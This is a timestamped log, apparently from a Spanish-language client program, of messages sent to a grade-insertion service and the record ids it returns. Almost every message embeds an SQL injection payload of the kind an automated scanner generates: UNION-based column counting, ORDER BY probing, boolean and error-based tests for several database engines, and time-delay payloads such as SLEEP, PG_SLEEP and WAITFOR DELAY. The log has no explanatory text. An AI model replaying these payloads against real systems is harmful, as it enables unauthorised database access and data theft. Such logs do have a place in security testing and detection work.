+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  56067
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  70646
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  260591
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  776750
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  768109
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  213343
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  145778
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  988409
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  364564
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  86676
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  306014
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') ORDER BY 1-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  553870
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') ORDER BY 9567-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  953284
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  31571
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  665151
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  795633
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  790708
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  659312
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  172723
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  444423
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  573224
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  312917
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  366618
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' ORDER BY 1-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  295322
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' ORDER BY 6521-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  840265
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  580946
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  971912
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  815608
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  373494
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  988977
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  364808
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  112638
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  843935
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  426499
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  695902
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,3674
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  684289
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10')"')'()('
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  554496
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) AND 9359=1521 AND (3253=3253
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  294870
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) AND 5314=5314 AND (4066=4066
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  23190
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) AND 2889=5111 AND (5359=5359
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  37540
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 AND 7140=8925
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  704423
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 AND 5314=5314
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  797975
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 AND 8044=2266
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  684597
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') AND 7101=7665 AND ('rWwg'='rWwg
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  894122
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') AND 5314=5314 AND ('pnDO'='pnDO
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  81203
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') AND 3500=3572 AND ('IiSY'='IiSY
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  92055
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' AND 6058=1009 AND 'PHJi'='PHJi
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  710125
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' AND 5314=5314 AND 'Nflv'='Nflv
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  238834
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' AND 9499=1343 AND 'zCOx'='zCOx
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  727785
+2012-05-02 19:34:28 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) AND (SELECT 1913 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (1913=1913) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (7931=7931
+2012-05-02 19:34:28 -0500 respuesta recibida: Tu id del registro es  551967
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 AND (SELECT 1913 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (1913=1913) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  678441
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') AND (SELECT 1913 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (1913=1913) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('wKKN'='wKKN
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  422176
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' AND (SELECT 1913 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (1913=1913) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'ATYU'='ATYU
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  397535
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) AND 4640=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (4640=4640) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND (3164=3164
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  227956
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 AND 4640=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (4640=4640) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC)
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  346613
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') AND 4640=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (4640=4640) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND ('KJSf'='KJSf
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  709456
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' AND 4640=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (4640=4640) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND 'JZyN'='JZyN
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  561938
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) AND 2034=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (2034=2034) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND (2950=2950
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  590911
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 AND 2034=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (2034=2034) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58)))
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  737733
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') AND 2034=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (2034=2034) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND ('ujNn'='ujNn
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  545188
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' AND 2034=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (2034=2034) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND 'USQK'='USQK
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  222686
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) AND 9193=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (9193=9193) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND (3775=3775
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  814664
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 AND 9193=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (9193=9193) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL)
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  976521
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') AND 9193=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (9193=9193) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND ('oPUC'='oPUC
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  306290
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' AND 9193=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (9193=9193) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND 'NXff'='NXff
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  773787
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10); SELECT SLEEP(5);-- 
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  793966
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10; SELECT SLEEP(5);-- 
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  364842
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10'); SELECT SLEEP(5);-- 
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  130839
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10'; SELECT SLEEP(5);-- 
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  817848
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10); SELECT PG_SLEEP(5);--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  822064
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10; SELECT PG_SLEEP(5);--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  901802
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10'); SELECT PG_SLEEP(5);--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  902135
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10'; SELECT PG_SLEEP(5);--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  357371
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10); WAITFOR DELAY '0:0:5';--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  781795
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10; WAITFOR DELAY '0:0:5';--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  976416
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10'); WAITFOR DELAY '0:0:5';--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  339037
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10'; WAITFOR DELAY '0:0:5';--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  336986
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) AND SLEEP(5) AND (7350=7350
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  823651
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 AND SLEEP(5)
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  297177
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') AND SLEEP(5) AND ('BpGe'='BpGe
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  354445
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' AND SLEEP(5) AND 'vaAh'='vaAh
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  132910
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) AND 3623=(SELECT 3623 FROM PG_SLEEP(5)) AND (7729=7729
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  529867
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 AND 3623=(SELECT 3623 FROM PG_SLEEP(5))
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  522927
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') AND 3623=(SELECT 3623 FROM PG_SLEEP(5)) AND ('YyGy'='YyGy
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  80364
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' AND 3623=(SELECT 3623 FROM PG_SLEEP(5)) AND 'Ycid'='Ycid
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  857029
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) WAITFOR DELAY '0:0:5'--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  407964
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 WAITFOR DELAY '0:0:5'--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  319138
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') WAITFOR DELAY '0:0:5'--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  427087
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' WAITFOR DELAY '0:0:5'--
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  835744
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) AND 3262=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(87)||CHR(117)||CHR(75),5) AND (7201=7201
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  681015
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 AND 3262=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(87)||CHR(117)||CHR(75),5)
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  915512
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') AND 3262=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(87)||CHR(117)||CHR(75),5) AND ('xvxP'='xvxP
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  950425
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' AND 3262=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(87)||CHR(117)||CHR(75),5) AND 'eJVP'='eJVP
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  748479
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) ORDER BY 1#
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  875926
+2012-05-02 19:34:29 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) ORDER BY 2013#
+2012-05-02 19:34:29 -0500 respuesta recibida: Tu id del registro es  143352
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  669932
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  422663
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  443994
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  919350
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  406365
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  123577
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  328633
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  138201
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  258769
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  122608
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, CONCAT(0x3a6d6c733a,0x496850736a6f51484346,0x3a696a673a), NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  706928
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x664a4347767569455174,0x3a696a673a)#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  358724
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT CONCAT(0x3a6d6c733a,0x6a476b4551536a617876,0x3a696a673a), NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  876755
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x566c625776495a59434c,0x3a696a673a), NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  949106
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x73766861586975496b6c,0x3a696a673a), NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  649729
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, CONCAT(0x3a6d6c733a,0x6d6c6b624a6c58546b52,0x3a696a673a), NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  5908
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,-9886) UNION ALL SELECT NULL, NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x775a77456c637845596d,0x3a696a673a), NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  674061
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,-4041) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x72717a5a7a6150536762,0x3a696a673a)#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  216823
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,-7385) UNION ALL SELECT CONCAT(0x3a6d6c733a,0x6d6c4951565257667870,0x3a696a673a), NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  708016
